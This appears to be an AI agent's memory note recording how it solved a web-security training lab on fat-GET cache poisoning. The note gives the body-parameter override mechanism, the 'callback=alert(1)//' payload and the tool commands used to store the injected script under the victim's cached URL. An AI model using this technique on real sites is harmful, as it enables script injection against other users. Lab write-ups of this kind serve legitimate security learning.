---
metadata:
  node_type: memory
name: "Web Cache Poisoning Fat GET"
description: "Fat-GET cache poison: body params override query params; poison the script URL key the victim loads"
last_updated: 2026-10-10T15:53:56+08:00
created: 2026-10-10T15:53:56+08:00
---

Target: /web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get (fresh instance, reused:false).

Mechanism (verified):
- Home page loads a script tag `/js/geolocate.js?callback=setCountryCookie`; the victim's Chrome loads that exact URL.
- The origin parses a GET body as parameters and lets the body's `callback` override the query value:
  GET `/js/geolocate.js?callback=setCountryCookie&z=1` + body `callback=alert(1)//` (cache miss) returned
  `...\nalert(1)//({"country":"United Kingdom"});` -> executes alert(1).
- The cache key excludes the body: poisoning the victim's exact URL with a fat GET stores the wrapped payload under the victim's key.

Steps that worked:
1. page_read lab page -> lab_id (445170885A5022D81BEAF56ED8C332D3CE302FE5D37E99E61A0674D3AC3E6260).
2. range_launch launch <lab_id> --jar /tmp/cj1.json -> instance.
3. http_dump home page -> sink script URL.
4. http_dump GET + --body on an uncached query variant to confirm body-param override (miss renders).
5. fatget_poison <victim-url> --body 'callback=alert(1)//' --count 12 --interval-secs 4 (entry max-age=35; keep rounds coming until flip).
6. Plain no-body GET to the same URL -> X-Cache hit, body `alert(1)//({...})` = poison resident on the victim's key.
7. banner_verdict -> solved:true, "Congratulations, you solved the lab!".

Notes:
- First probe of the victim URL returned X-Cache hit with a stale benign entry (max-age=35); a hit never re-renders, so poisoning needs the miss round.
- Body length is the cheap discriminator: benign 201 vs poisoned 195.
- fatget_poison's per-round report does not flag the payload itself; read body_len/X-Cache and confirm with a plain GET.

